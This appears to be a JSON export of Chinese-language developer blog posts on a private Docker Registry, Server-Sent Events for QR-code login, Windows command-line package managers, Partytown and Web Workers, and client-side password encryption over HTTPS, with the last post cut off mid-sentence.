[{"content":" 參考網站\n前言 深度應用 Docker 容器後常會走到這一步 - 自建 Docker Registry (容器 Image 倉庫)。\n不管用 docker 指令或跑 Docker Compose，建立容器都需先載入 Docker Image，若是公開 Image，透過 docker pull 指令、在 docker-compose.yml 指定 image 來源、或 Dockerfile 寫 FROM imageName:tag，都可從 Docker Hub 下載，私有程式或內部應用系統不適合上傳第三方系統，企業內部主機則可能位於無法連 Internet 的環境，從 Docker Hub 下載這條路便不可行。簡單做法是用 docker save container-name \u0026gt; container-name.tar 再 scp 上傳到 Docker 主機用 docker load -i container-name.tar 載入，但儲存、上傳、載入(有時還需要壓縮解壓縮)程序複雜，若要部署多台主機格外沒效率。因此，建立私有 Docker Registry 取代 Docker Hub 的角色，是較省事有效率的實務做法。\n(補充：關於 Container Image 部署，可參考保哥這篇遷移容器映像(Container Image)到另一台主機的各種作法)\nDocker 支援自建私有 Registry 伺服器，不意外地有安裝成 Docker 容器的便捷做法。經簡單設定與安裝，架一台私有 Docker Registry 儲存非公開容器 Image 並不困難。說是一回事，做是一回事，這篇來實地演練一次。\n開始 首先準備一台 Docker 主機，裝好 Nginx + Certbot 服務，我是在 Azure 開一個 B1s 小 VM 來跑。\n註：Azure 有 Azure Container Registry 的現成雲端服務，做法更簡便。學習在 Linux 跑 Docker 做法是為將來在離線環境建立 Docker Registry 做準備。\n以我的標準，即便內部伺服器也要控管存取身分，不能讓閒雜人等隨便用。Docker Registry 支援帳號密碼登入，但前題要啟甪 TLS HTTPS 連線，故除了安裝 htpasswd 工具設定密碼雜湊檔，並需要安裝 mkcert 建立 TLS 憑證：\n1 sudo apt-get install apache2-utils mkcert 我在主機端建了一個 /var/registry 資料夾放 Docker Registry 相關檔案，接著用 mkcert 建立自簽憑證給 Registry 用：\n設定帳號密碼：\n準備好 Docker Compose 設定檔，REGISTRY_HTTP_TLS_CERTIFICATE 及 REGISTRY_HTTP_TLS_KEY 環境變數指向 mkcert 剛才製作的兩個 pem 檔名、REGISTRY_AUTH_HTPASSWD_PATH 指向密碼檔名；volumes 部分將 Docker 的 Image 資料、憑證、認證資料對應到 /var/registry 實體路徑保存，以免容器關閉後資料消失：\ndocker-compose.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 version: \u0026#34;3\u0026#34; services: registry: restart: always image: registry:2 ports: - 5000:5000 environment: REGISTRY_HTTP_TLS_CERTIFICATE: /certs/localhost.pem REGISTRY_HTTP_TLS_KEY: /certs/localhost-key.pem REGISTRY_AUTH: htpasswd REGISTRY_AUTH_HTPASSWD_PATH: /auth/htpasswd REGISTRY_AUTH_HTPASSWD_REALM: Registry Realm volumes: - /var/registry/data:/var/lib/registry - /var/registry/certs:/certs - /var/registry/auth:/auth 用 docker-compose up -d 啟動容器，若一切正常，用 curl https://localhost:5000/v2/ 測試，若傳回 {\u0026quot;errors\u0026quot;:[{\u0026quot;code\u0026quot;:\u0026quot;UNAUTHORIZED\u0026quot;,\u0026quot;message\u0026quot;:\u0026quot;authentication required\u0026quot;,\u0026quot;detail\u0026quot;:null}]} 就代表成功了。\n接著來測試 Push Image 到私有 Registry，操作程序是用 docker tag 為己載入容器加上 localhost:5000/aspnetapp 這種標籤，此時等同同一個 IMAGE ID 有兩個 Tag，由於 Registry 需要登入，用剛才的設定帳號密碼以指令 docker login 登入，接著 docker push localhost:5000/aspnetsapp 就能完成上傳：\n檢查資料夾 /var/registry/data/docker/registry/v2/repositories/aspnetapp/_layers/sha256 可看見上傳過程出現的四個 Layer ID，成功！\n接下來試試從 Windows Docker Desktop 從 VM 的對外網域名稱下載容器 Image 執行，一樣輕鬆秒殺：\n以上，一台自建 Docker Registry 便上線服役囉～\n","date":"2023-01-31T00:00:05Z","image":"https://live.staticflickr.com/65535/52660201816_629b9ddf09_o.png","permalink":"https://wayneblog.ga/2023-01-31/docker-private-registry/","title":"【Docker】建立私有 Docker Registry"},{"content":" 參考網站\n參考網站\n參考網站\n參考網站\n參考網站\n多因素認證(Multiple Factor Authentication，MFA)是網頁常會用到一種技巧，介面停在登入網頁，等待手機 App 操作，網頁能偵測 App 動作是否完成，若驗證成功自動導向已登入畫面，本篇來簡易的實作此流程。\n以 Facebook 為例 以 Facebook 為例，若有啟動兩階段驗證，第一次登入網站，輸入密碼後會出現以下畫面：\n除了開代碼產生器(Authenticator App)查驗證碼在網頁輸入，有安裝 Facebook App 且為登入狀態的手機也會出現「剛剛是你本人登入的嗎？」登入，只要按「是」即可跳過輸入驗證碼步驟，自動進入登入後畫面：\n實作 「需要雙重驗證碼」網頁必定可持續從網站接收最新狀態，才能做到手機 App 一按「是」馬上接到通知。對前端網頁來說，這不是什麼新鮮技術，做法很多，從雖可恥但有用的 setInterval 定期查詢、Long Polling、Server-Sent Event、WebSocket，乃至更高階的程式庫如 SignalR，都是解法。這邊我使用 Servent-Sent Event (SSE)，理由是比輪詢即時有效率，不像 WebSocket 會因防火牆、Proxy 或網站伺服器不支援而失效，又比 SignalR 來得輕巧。\n本專案已改用 ASP.NET Core，做法不同。查了一下，發現 NuGet 套件 Lib.AspNetCore.ServerSentEvents，文件清楚且擴充彈性不錯，沒必要自己造輪子。\n先看試做成果：\n我建了一個 ASP.NET Core MVC 站台，首頁放了一顆鈕，按下會彈出 QR Code 網頁，10 秒內掃瞄 QR Code 呼叫指定網址，首頁會從 SSE 接獲通知確認掃瞄完成。為方便本機測試，我加了一顆鈕用 JavaScript 程式瀏覽指定 URL 模擬掃瞄 QR Code 動作。而等待掃瞄過程會計時，未在時限內完成將判定逾時。\nIndex.cshtml 寫法如下，原理是開啟 EventSource() 接收伺服器端 SSE 回應，新開啟的 QR Code 視窗引導使用者呼叫特定連結觸發從 SSE 連線回傳結果，正常由 onmessage 事件接收、逾時或出錯則由 onerror 事件接收：\nViews/Home/Index.cshtml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 @{ ViewData[\u0026#34;Title\u0026#34;] = \u0026#34;Home Page\u0026#34;; } \u0026lt;div class=\u0026#34;text-center\u0026#34;\u0026gt; \u0026lt;h1 id=\u0026#34;h\u0026#34; class=\u0026#34;display-4\u0026#34;\u0026gt;Welcome\u0026lt;/h1\u0026gt; \u0026lt;button id=\u0026#34;btn\u0026#34; onclick=\u0026#34;showQRCode()\u0026#34;\u0026gt;Scan QR Code\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var qrCodeWin; var source = new EventSource(\u0026#39;/sse/@ViewBag.Token\u0026#39;); function showResult(msg, error) { qrCodeWin \u0026amp;\u0026amp; qrCodeWin.close(); document.getElementById(\u0026#39;btn\u0026#39;).remove(); let h = document.getElementById(\u0026#39;h\u0026#39;); h.innerText = msg; if (error) h.style.color = \u0026#39;red\u0026#39;; } source.onmessage = function (event) { showResult(event.data); }; source.onerror = function (event) { showResult(event.data, true); }; function showQRCode() { qrCodeWin = window.open(\u0026#39;@Url.Content($\u0026#34;~/Home/QRCode/{ViewBag.Token}\u0026#34;)\u0026#39;, \u0026#39;_blank\u0026#39;, \u0026#39;width=300,height=300\u0026#39;); } \u0026lt;/script\u0026gt; 初步測試成功，接著改寫成模仿手機掃 QR Code 的登入流程。在我 Home 加一個 Test 方法，/Views/Home/Test.cshtml 如下，直接在頁面顯示 QR Code，QR Code 指定連結被呼叫後由 SSE 傳來通知，網頁導向測試成功畫面：\nViews/Home/Test.cshtml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 @{ } \u0026lt;div class=\u0026#34;text-center\u0026#34;\u0026gt; \u0026lt;img id=\u0026#34;qrc\u0026#34; src=\u0026#34;@ViewBag.QRCodePng\u0026#34; alt=\u0026#34;QR Code\u0026#34; /\u0026gt; \u0026lt;div id=\u0026#34;msg\u0026#34;\u0026gt; Timeout: \u0026lt;span id=\u0026#34;t\u0026#34;\u0026gt;@ViewBag.TimeoutSecs\u0026lt;/span\u0026gt;s \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var source = new EventSource(\u0026#39;/sse/@ViewBag.Token\u0026#39;); source.onmessage = function (event) { location.href = \u0026#39;@Url.Action(\u0026#34;Succ\u0026#34;, \u0026#34;Home\u0026#34;)\u0026#39;; }; source.onerror = function (event) { document.getElementById(\u0026#39;qrc\u0026#39;).remove(); document.getElementById(\u0026#39;msg\u0026#39;).innerText = event.data; }; var timeout = @ViewBag.TimeoutSecs; var h = setInterval(function () { timeout--; document.getElementById(\u0026#39;t\u0026#39;).innerText = timeout; if (timeout == 0) clearInterval(h); }, 1000); \u0026lt;/script\u0026gt; 以上範例中，以手機掃瞄並瀏覽 QR Code 內含網址判定成功，改為 App 使用手機實體保存的金鑰對隨機產生內容做數位簽章，將可達到專業水準的安全防護，有機會做出土砲版多重因素驗證或免密碼登入。\n簡單說一下伺服器端程式寫法。SSE 部分主要靠 Lib.AspNetCore.ServerSentEvents 程式庫處理，Program.cs 有以下幾個地方要改：(中文註解處)\nProgram.cs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 using Lib.AspNetCore.ServerSentEvents; using sse_notify.Models; var builder = WebApplication.CreateBuilder(args); // 註冊 SSE 服務 builder.Services.AddServerSentEvents(); // 改由 URL 包含的 Guid 取得 ClientId builder.Services.AddSingleton\u0026lt;IServerSentEventsClientIdProvider, SseClientIdFromPathProvider\u0026gt;(); // 自訂一個繼承 ServerSentEventsService 及實作 IServerSentEventsService 的類別處理通知 // 使用程式庫提供的 AddServerSentEvents 擴充方法註冊 builder.Services.AddServerSentEvents\u0026lt;SseNotifyService, InProcSseNotifyService\u0026gt;(options =\u0026gt; { // 程式庫提供 KeepAlive 功能 options.KeepaliveMode = ServerSentEventsKeepaliveMode.Always; options.KeepaliveInterval = 15; }); // Add services to the container. builder.Services.AddControllersWithViews(); var app = builder.Build(); app.UseStaticFiles(); app.UseRouting(); app.UseAuthorization(); // 定義 SSE 對映的服務及路由及型別，每次等待的掃瞄操作產生隨機 GUID 識別 app.MapServerSentEvents\u0026lt;InProcSseNotifyService\u0026gt;(\u0026#34;/sse/{regex(^[=0-9a-z].+)$)}\u0026#34;); app.MapControllerRoute( name: \u0026#34;default\u0026#34;, pattern: \u0026#34;{controller=Home}/{action=Index}/{id?}\u0026#34;); app.Run(); 自訂類別要繼承 ServerSentEventsService，寫法可參考 API 文件，以下是我的做法。QR Code 掃瞄執行結果打算用訂閱與發布設計模式，測試開發階段靠記憶體中的 Dictionary、IMemoryCache 交換資料；在負載平衡架構會有多台並行，則需要分散式的訂閱發布架構，可使用 Redis、RabbitMQ 之類的解決方案。為此，我宣告了 SseNotifyService 抽象型別，先做了 InProcessSseNotifyService 用 IMemoryCache 簡單搞定，正式運轉如有需要再改用 Redis 或其他 MQ 機制實作。\nModels/SseNotifyService.cs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 using Lib.AspNetCore.ServerSentEvents; using Microsoft.Extensions.Options; namespace sse_notify.Models { // https://tpeczek.github.io/Lib.AspNetCore.ServerSentEvents/articles/getting-started.html public abstract class SseNotifyService : ServerSentEventsService, IServerSentEventsService { public SseNotifyService(IOptions\u0026lt;ServerSentEventsServiceOptions\u0026lt;ServerSentEventsService\u0026gt;\u0026gt; options) : base(options.ToBaseServerSentEventsServiceOptions\u0026lt;ServerSentEventsService\u0026gt;()) { } public abstract void Subscribe(Guid token, int timeoutSecs = 300); public async Task SendEventAsync(Guid token, string type, string message) { var client = this.GetClients().SingleOrDefault(o =\u0026gt; o.Id == token); if (client != null) { await client.SendEventAsync(new ServerSentEvent() { Type = type, Data = new List\u0026lt;string\u0026gt; { message } }); } } public abstract Task Notify(Guid token, string message); } } Models/InProcSseNotifyService.cs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 using Lib.AspNetCore.ServerSentEvents; using Microsoft.Extensions.Caching.Memory; using Microsoft.Extensions.Options; namespace sse_notify.Models; public class InProcSseNotifyService : SseNotifyService, IServerSentEventsService { private readonly IMemoryCache _cache; public InProcSseNotifyService(IOptions\u0026lt;ServerSentEventsServiceOptions\u0026lt;ServerSentEventsService\u0026gt;\u0026gt; options, IMemoryCache cache) : base(options.ToBaseServerSentEventsServiceOptions\u0026lt;ServerSentEventsService\u0026gt;()) { _cache = cache; } public override void Subscribe(Guid token, int timeoutSecs = 300) { var key = $\u0026#34;S:{token}\u0026#34;; var semaphore = new SemaphoreSlim(0); var timeout = TimeSpan.FromSeconds(timeoutSecs); _cache.Set(key, semaphore, timeout); var task = Task.Factory.StartNew(async () =\u0026gt; { //wait for semaphore to be released if (!await semaphore.WaitAsync(TimeSpan.FromSeconds(timeoutSecs))) await SendEventAsync(token, \u0026#34;error\u0026#34;, \u0026#34;Timeout\u0026#34;); //try get response else if (!_cache.TryGetValue\u0026lt;string\u0026gt;($\u0026#34;R:{token}\u0026#34;, out var res)) await SendEventAsync(token, \u0026#34;error\u0026#34;, \u0026#34;No response\u0026#34;); else await SendEventAsync(token, \u0026#34;message\u0026#34;, res); }); } public async override Task Notify(Guid token, string message) { var key = $\u0026#34;S:{token}\u0026#34;; if (!_cache.TryGetValue(key, out SemaphoreSlim semaphore)) throw new ApplicationException(\u0026#34;Token not found\u0026#34;); _cache.Set(\u0026#34;R:\u0026#34; + token.ToString(), message); semaphore.Release(); _cache.Remove(key); } } SSE 程式庫識別客戶端連線的預設做法是從 HttpContext.User.Identity 抓使用者身分，若使用者有多條 SSE 連線，每條連線都傳訊息也無妨。但我的應用情境，每次顯示 QR Code 為獨立傳輸通道，會以 GUID 識別，故要自訂識別 Client Id 邏輯。做法是寫個自訂類別實作 IServerSentEventsClientIdProvider，在 Program.cs DI 註冊成 Singleton：\nModels/SseClientIdFromPathProvider.cs 1 2 3 4 5 6 7 8 9 10 11 12 public class SseClientIdFromPathProvider : IServerSentEventsClientIdProvider { public Guid AcquireClientId(HttpContext context) { var path = context.Request.Path.Value; var m = Regex.Match(path, @\u0026#34;(?i)/(?\u0026lt;g\u0026gt;[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})$\u0026#34;); if (m.Success) return Guid.Parse(m.Groups[\u0026#34;g\u0026#34;].Value); return Guid.NewGuid(); } public void ReleaseClientId(Guid clientId, HttpContext context) { } } 瑣碎細節還不少，就不一一介紹了。範例專案已放上 Github，大家如有興趣再下載回去研究。\n","date":"2023-01-31T00:00:00Z","image":"https://live.staticflickr.com/65535/52659620952_e6d1186f14_o.jpg","permalink":"https://wayneblog.ga/2023-01-31/web-wait-for-qrcode-scan/","title":"【Server-Sent Event】在網頁等待手機端完成操作"},{"content":" 參考網站\n參考網站\n參考網站\n參考網站\n參考網站\n參考網站\n這些年我漸漸變成 CLI 愛好者，覺得很多時侯敲指令比滑滑鼠簡單有效率，跟伙伴溝通更簡潔精確(例如：「git add Program.cs \u0026amp;\u0026amp; git commit -m \u0026ldquo;poc\u0026rdquo;」對上「切換到 Git Changes，在 Changes 的 Program.cs 按右鍵點 Stage，在 Message 欄位輸入 poc，然後點下面那個 Commit\u0026hellip;」，簡單十倍)，常用指令可以用記事本保存快速重複操作，寫幾行程式可將複雜作業自動化或改為批次作業或排程，比 GUI 操作更容易擴充及應用。\n安裝軟體這檔事也是如此，習慣了在 Linux 下指令 apt-get install XXX 就裝好軟體，便會覺得 Google 找網站下載檔案再跑安裝程式或解壓縮的做法太繁瑣。\nWindows 其實也有下指令裝軟體的做法，最早只有 Chocolatey，後來陸續加入其他選擇，我的資訊有點落後，在這篇做個更新。\n目前 Windows 上常用的指令式軟體安裝服務有三個：Chcolatey、Scoop 及 winget。\nPoint Chocolatey Scoop winget 開發商 Chocolatey Software, Inc. lukesampson Microsoft Corp. 發布時間 Mar. 2011 Sep. 2013 May 2020 是否開源 是 是 是 套件數量截至2020年7月18日 5036 2959 657 可用版本 since Win7、since Win2003 since Win7、since Win2008 Win10since ver 1709 難易度 有點麻煩 足夠 足夠 自建倉庫 足夠 足夠 足夠 免費/付費 免費部分付費 免費 免費 方便性 有點麻煩 足夠 有點麻煩 套件包內容 太棒了 足夠 有點麻煩 資料來源 (註：資料時間 2020/10，套件數已有變化)\n三者都是開源軟體，可免費使用(Chcolatey 有付費版提供企業需要的額外功能)，簡單歸納三者的差異。\n1. Chcolatey Chcolatey\n起源最早，目前有超過 9500 個套件，涵蓋許多常用軟體(Chrome、VLC Player)，Chocolatey 依賴 PowerShell 及 NuGet 運作，對非程式開發使用者來說比較複雜，安裝時需要管理者權限。\n2. Scoop Scoop\nScoop 的初衷是用於安裝系統工具，尤其是 Linux 常用但 Windows 缺少的工具程式。它也能用來安裝一般桌面程式，但需要新增特定安裝來源(Bucket)。\nScoop 最大的優點是軟體限縮在使用者環境，不修改 Registry 及系統設定，不需要管理者權限，不依賴 PowerShell/NuGet，使用較簡單。\n若算上散佈各地的 1100 個 Bucket，套件數量可達 27000 種，但引用時多了搜尋、確認對象跟設定來源的手續。\n3. winget winget\n2020 年才推出的 winget，血統純正是其最大優勢，winget 由微軟開發維護，但因推出時間較晚，套件數量不如前二者豐富，且因透過微軟商店安裝，限定 Windows 10 1709 之後的版本才能使用，跟 Windows Terminal 一樣，要應用在 Server 及網路受限環境得花點功夫。\n小結 若要安裝 Windows 上的工具程式或軟體的話：\nChocolatey 仍是最方便的選擇，單一來源涵蓋幾乎大小會用到的軟體，並能處理 Registry、右鍵選單等系統層次設定，但執行時需要管理者權限。\nScoop 以開發用的工具程式為主，最大的優點安裝範圍會限制在當時登入的使用者環境下，不干擾系統設計也不需要管理者權限；Scoop 也能安裝 Chrome、VLC 播放器這類軟體，但需要找到並設定安裝來源。\nwinget 是微軟的官方指令安裝系統，預設透過微軟商店下載安裝，要在 Windows Server 或網路受限環境使用需費點工夫，且因出道較晚，提供的軟體種類不如其他二者齊全。\n","date":"2023-01-31T00:00:00Z","image":"https://live.staticflickr.com/65535/52660107874_752a7075c3_o.jpg","permalink":"https://wayneblog.ga/2023-01-31/windows-chocolatey-scoop-winget/","title":"【Windows】指令式軟體安裝服務比較：Chocolatey、Scoop 與 winget"},{"content":" 參考網站\n參考網站\n參考網站\n參考網站\n前端效能調校的技法多如牛毛，但最明顯的效能殺手不外乎是 JavaScript 佔用 Main Thread 而導致頁面無法回應的狀況了。最近研究 Partytown 這個函式庫，他用了一個非常巧妙的技巧，把部分 JS 自動切換到 Web Workers 背景執行。這篇文章我就來分享如何將 Partytown 安裝到任意網站中。\n如何安裝 Partytown 到任意網站 透過 Partytown CLI 下載 Partytown 函式庫 以下命令會在當前目錄建立一個 ~partytown 資料夾(建議統一用這個名稱)：\n1 npx \u0026#34;@builder.io/partytown\u0026#34; copylib ~partytown 將 ~partytown 資料夾上傳到網站根目錄 如果是 ASP.NET Core 的話，可以上傳到 wwwroot 目錄下，或是在 ASP.NET Core 專案根目錄輸入以下命令： 1 npx \u0026#34;@builder.io/partytown\u0026#34; copylib \u0026#34;wwwroot\\~partytown\u0026#34; 如果是 Node.js 的話，可以上傳到 public 目錄下，或是在 ASP.NET Core 專案根目錄輸入以下命令： 1 npx \u0026#34;@builder.io/partytown\u0026#34; copylib \u0026#34;public/~partytown\u0026#34; 你也可以設定好 package.json 加入到建置流程中：\n1 npm install \u0026#34;@builder.io/partytown\u0026#34; package.json 1 2 3 4 5 6 { \u0026#34;scripts\u0026#34;: { \u0026#34;build\u0026#34;: \u0026#34;npm run partytown \u0026amp;\u0026amp; ng build\u0026#34;, \u0026#34;partytown\u0026#34;: \u0026#34;partytown copylib public/~partytown\u0026#34; } } 總之，上傳到網站根目錄就對了！(詳見 Copy Library Files 有更完整的說明)\n調整網頁中的 \u0026lt;script\u0026gt; 標籤語法 請將以下：\n1 \u0026lt;script\u0026gt;...\u0026lt;/script\u0026gt; 全部修改為：\n1 \u0026lt;script type=\u0026#34;text/partytown\u0026#34;\u0026gt;...\u0026lt;/script\u0026gt; 就大功告成！\n使用的注意事項 雖然 Partytown 函式庫的初衷非常理想，就是管理第三方 JS 函式庫(third-party scripts)，徹底降低 JS 佔用 Main Thread 的狀況。但實際上還是有不少 JS 檔案在透過 Partytown 載入到 Web Workers 執行後就掛掉了，所以實際上 Partytown 並不適用於所有 JS 執行，因此不太建議把網站上所有 JS 都改用 Partytown 來載入。\n除此之外，目前 Partytown 因為有用到 Atomics API 的關係，它的相容性確實有些限制，有些太舊的手機版本是沒有支援的！詳見 JavaScript built-in: Atomics | Can I use 說明。\n最後要提醒大家的地方，就是使用 Partytown 的 Trade-Offs (權衡)。因為這個世界沒有銀子彈，有一好就沒兩好，使用 Partytown 不見得適用所有的網頁開發情境。以下是 Partytown 官方認為不適用的地方：\n大量的 DOM 操作會被節流(Throttled DOM Operations) 由於在 Web Workers 無法直接存取 DOM，所以 Partytown 會透過 onmessage 事件傳給 Main Thread 來處理，所以 DOM 處理的速度反而會變慢！\n只要是 UI 特別吃重的 JS 函式庫，處理大量 DOM 操作，都不太適合用 Partytown 來管理 如果執行實際效果不理想，其實就這個 JS 不要用 Partytown 即可！\n若第三方函式庫在載入時沒有設定 CORS Headers 的話，透過 Partytown 是無法載入的 必須透過 Proxying Requests 從**相同來源(Same-origin)**載入！\n事件處理只要用到 event.preventDefault() 就會失效 透過 Web Workers 執行 event callback 會導致 event.preventDefault() 的行為失效！\n若透過 Partytown 管理的 JS 動態建立 iframe 的話，document.cookie、localStorage 與 sessionStorage 都會讀不到！ 基本上程式不會報錯，但就是沒效果，所以使用上要注意！\n透過 setInterval() 不斷的對 document 進行 DOM 操作 這也會失去使用 Partytown 的價值，因為頻繁的 DOM 操作反而會讓 Web Workers 過於忙碌！\n目前確定很適合用 Partytown 來管理的第三方函式庫，從官網是有整理出來的，大家可以多多利用，照著官網設定即可：\nCommon Services Facebook Pixel Google Tag Manager (GTM) ","date":"2023-01-30T00:00:00Z","image":"https://live.staticflickr.com/65535/52657535787_2ab04e0fac_o.jpg","permalink":"https://wayneblog.ga/2023-01-30/npm-partytown-from-web-worker/","title":"前端效能調校：使用 Partytown 將笨重的 JavaScript 放到 Web Workers 執行"},{"content":" 參考網站\n參考網站\n參考網站\n參考網站\n最近有人在臉書前端交流社群發了一則貼文，內容是他看到了一個問題：請問登入api傳賬號、密碼json明碼會有問題嗎?，想知道大家對這個問題的看法。\n而底下的回答大部份都是覺得「有用 HTTPS 就好了，沒必要額外再實作一層加密，沒有什麼太大的意義」.\n老實說我以前也是這樣認為的，而且過去在社群中就有出現過類似的討論。我那時候想說都已經有 HTTPS 了，而 HTTPS 本身的目的就是為了保障傳輸的安全，為什麼要自己再做加密？\n但這一兩年接觸資安以後，我的想法有了改變，我認為前端在傳輸前把密碼加密，是有其意義的，而接下來我會詳細說明我的理由。\n定義問題 在進入正題之前，我想把問題定義得更明確一點，免得出現一堆張飛打岳飛，拿兩個完全不同的情境來比較的狀況。在原文底下，就有不少留言在討論的是不同的問題，把問題先定義清楚滿重要的。\n首先，我們要比較的對象是：\n在使用 HTTPS 的前提下，打登入 API 時不做任何事直接傳送密碼的明文 在使用 HTTPS 的前提下，打登入 API 時先把密碼加密，再傳送到 server 這邊需要注意的是「兩個狀況都是 HTTPS」，所以如果你想講的是「沒必要自己發明新技術」或是「自己發明新的加密方式不會比較安全」等等，在這個前提下全都不適用。\n因為傳輸層還是靠 HTTPS 在傳輸，所以在這個階段並沒有自己發明新的方式，我只是在應用層自己把傳輸的資料額外加密一層而已。\n再來，先不考慮成本這件事，純粹只從技術的角度去看可能有哪些優缺點(成本相關的最後再來討論)。\n最後呢，我這邊的情境是「加密密碼」而非 hash，這是因為我覺得 hash 的狀況比較複雜，我自己想先用加密來舉例，而且這個加密是「非對稱式加密」。\n也就是我們可以想像已經有一把 public key 存在於 client 端(當然，每個人都可以拿得到)，在送出 request 以前，會先使用 JavaScript 把密碼用 public key 加密以後再送出，而 server 使用 private key 解密，拿到密碼以後 hash 過再存入資料庫中。\n綜合以上，這篇想處理的問題是：「已經使用了 HTTPS，在打登入 API 以前先把密碼加密過或是不做任何處理，這兩者的差別在哪？」\n而我們可以把回答分成兩個部分：\n假設 HTTPS 被破解了，是不安全的，差在哪？ 假設 HTTPS 是安全的，差在哪？ 假設 HTTPS 不安全，差在哪？ 首先，可以先想一下怎樣的狀況會造成 HTTPS 不安全，攻擊者掌握了系統的哪些部分？\n底下簡單分為四種狀況討論：\n攻擊者掌控整台電腦，信任惡意憑證 攻擊者成功執行了中間人攻擊 攻擊者可以在網路層監聽 request 並使用漏洞取得明文 攻擊者直接針對 HTTPS server 進行攻擊 攻擊者掌控整台電腦，信任惡意憑證 若是這種類型的狀況，那當然是有沒有加密都沒差，因為攻擊者都有其他更好的手段去取得你的密碼。\n攻擊者成功執行了中間人攻擊 那如果是「攻擊者成功執行了中間人攻擊（Man-In-The-Middle）」呢？你的電腦沒事，只是封包在傳輸的過程中被中間人攻擊。\n在這樣的前提底下，沒加密的情形就能直接被獲取密碼，而有加密的情形攻擊者只能獲取到加密過的密文而非明文。但需要注意的是既然是叫中間人攻擊，那攻擊者除了監聽你的 request 以外，也能傳送偽造的 response 給你，把前端用來加密密碼的部分換掉。\n因此無論密碼是否加密，攻擊者都可以拿到明文，只是如果有加密的話，攻擊者取得密碼的成本較高（需要先找到在哪邊加密的，然後把那段改掉）。\n攻擊者可以在網路層監聽 request 並使用漏洞取得明文 這個狀況跟上一個的不同之處在於這個只能讀，不能寫。若是有辦法解密 request 的封包，就能夠看到明文。\n所以如果有把密碼先加密，攻擊者就無法取得密碼的明文。\n這邊需要注意的是儘管無法取得明文，攻擊者依然可以透過重送請求來登入你的帳號（先假設沒有其他機制），所以你帳號還是被盜了，只是攻擊者不知道你的密碼明文。\n這有差嗎？有！\n假設他知道了你的密碼明文，就可以拿你的這組帳號密碼去各個服務都試試看，若是你其他網站也用同一組帳號密碼，就會跟著淪陷（俗稱的撞庫攻擊）。\n因此在這個狀況底下，加密密碼的安全性顯然是更高的。\n此時你可能會想問的問題是：「那在什麼狀況下攻擊者能夠取得 HTTPS 的明文？真的有可能嗎？」\n這邊有一份美國衛生及公共服務部 HHS 所做的簡報：SSL/TLS Vulnerabilities，裡面有記錄一些 SSL/TLS 曾經有過的漏洞，所以取得 HTTPS 的明文確實是有可能的。\n不過光是知道「有可能」是不夠的，應該問的是「機率高嗎？」，在討論風險的時候，通常也會根據風險的高低以及嚴重程度來決定該怎麼處理這個風險。\n答案是「機率很低」，簡報裡的漏洞最近的已經是 2017 年的事情了，而且是使用一些舊的、有問題的加密演算法，除此之外還需要符合不少其他條件，才能執行攻擊，所以我認為機率確實是很低的。\n以 2016 年發表的 DROWN(Decrypting RSA with Obsolete and Weakened eNcryption) 來說，Server 要支援 SSLv2，而攻擊者要能抓到加密過的 TLS connection，符合這些條件以後，進行一大堆運算後就可以解開 900 個 connection 中的 1 個，而運算成本在當時是 440 美金，約 13k 台幣。\n總之呢，針對這個狀況，我們可以說：\n假設攻擊者可以取得 HTTPS 的明文，那確實自己在應用層加密會更安全，但要符合這個假設的成本很高，發生機率很低\n攻擊者直接針對 HTTPS server 進行攻擊 這個分類我指的是在 2014 年發生過的 Heartbleed 漏洞，攻擊者可以藉由 OpenSSL 的漏洞讀取到 server 的記憶體。\n這個狀況跟上一個滿像的，如果有在 client 端先加密過密碼，那攻擊者在 server 上讀到的就是加密過後的，不知道密碼明文是什麼。\n所以結論跟上個一樣，就是加密密碼會更安全。\n中場總結 剛剛我們討論了幾種「HTTPS 變得不安全」的狀況，從以往發生過的案例可以得知「HTTPS 變得不安全」是有可能的。若是攻擊者能夠讀到 HTTPS 傳輸的明文，那在應用層將密碼加密，就能防止攻擊者取得密碼的明文，因此會比沒有加密來得更安全。\n如果要講得更詳細，可以從兩個維度去切入，一個是嚴重性（severity），另一個是可能性（possibility）。\n以嚴重性來說，不管有沒有加密密碼，只要攻擊者有辦法拿到 request 的內容，你的帳號就已經淪陷了，而有沒有加密唯一的差別只有攻擊者是否能取得明文密碼，有的話就可以執行撞庫攻擊，拿密碼去試更多其他的網站。\n而可能性就是「HTTPS 的明文被拿到」這件事的可能性，從過往的經歷以及研究來看，雖然是有可能的，但在 2023 年的今天，機率是很低的。\n因此我們現階段的結論應該是：\n攻擊者若是可以繞過 HTTPS 拿到明文的 request，那在應用層將密碼加密，確實會比較安全，但要注意的是要達成這個前提非常困難，發生的機率極低。\n假設 HTTPS 是安全的 接下來我們討論第二種狀況，那就是假設 HTTPS 是安全的，沒有任何人可以從中間看到明文的內容，這應該也是留言區中大多數人假設的前提。\n在這種狀況下，會有哪些風險呢？\n有一個現實生活中會發生，而且也確實發生過的風險，那就是 logging。\n身為前端工程師，在前端加裝一些 error tracking 的服務是很合理的事情，若是我們直接實作一個「只要伺服器回傳 5xx，就把 request 記錄起來」的機制，如果好巧不巧哪天登入的 API 出現這個狀況，你就可以在 log 裡面看到使用者的明文密碼。\n而且不只前端，後端也可能有類似的機制，碰到一些問題就把 request 整個寫到 log 檔去，方便以後查看以及 debug，一不小心密碼就可能被寫進去。\n在這種狀況下，在 client 端先把密碼加密顯然是有好處的，那就是在這些錯誤處理的 log 中，被記錄下來的密碼會是密文，除非你有密鑰，否則你是不會知道使用者的密碼的。\n我在網路上找到一篇跟我論點一樣的文章：The case for client-side hashing: logging passwords by mistake，裡面有附上很多參考連結，都是以前各大公司不小心把密碼的明文記錄下來的案例。\n然後有個小地方稍微講一下，上面這篇做的是「在 client 端 